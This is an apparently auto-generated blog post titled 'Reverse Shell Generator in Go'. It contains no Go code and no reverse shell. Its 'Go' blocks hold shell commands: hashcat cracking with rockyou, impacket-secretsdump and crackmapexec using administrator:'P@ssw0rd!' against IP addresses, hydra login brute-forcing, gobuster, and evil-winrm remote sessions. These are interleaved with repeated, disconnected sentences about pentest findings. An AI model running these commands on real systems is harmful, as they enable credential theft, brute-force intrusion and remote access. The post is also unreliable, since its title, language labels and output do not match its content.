---
TitleSEO: "Reverse Shell Generator in Go | ZureFX"
TitlePost: "Reverse Shell Generator — Go"
Author: "ZureFX"
Description: "A Go script for reverse shell generator. Built for security research and automation."
Keywords: "rust, automation, scanner, go"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-548.html"
URL_IMAGES: ""
Date: "2025-03-13"
Tags: "Rust, Automation, Scanner, Go"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-548"
Permalink: "/scripting/script-reverse-shell-generator-548.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `hydra`
- `bloodhound`
- `john`

## Implementation

### Core Logic

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

```go
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.40.84.121
impacket-secretsdump administrator:'P@ssw0rd!'@10.71.217.77
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

```go
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.66.165.142 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.25.82.45 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.73.208.44/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.77.115.89 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.119.158.13 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.15.210.172/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.17.148.25 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

```
[+] Scanning target...
[+] Found 4 results
[+] Done in 25.49s
```
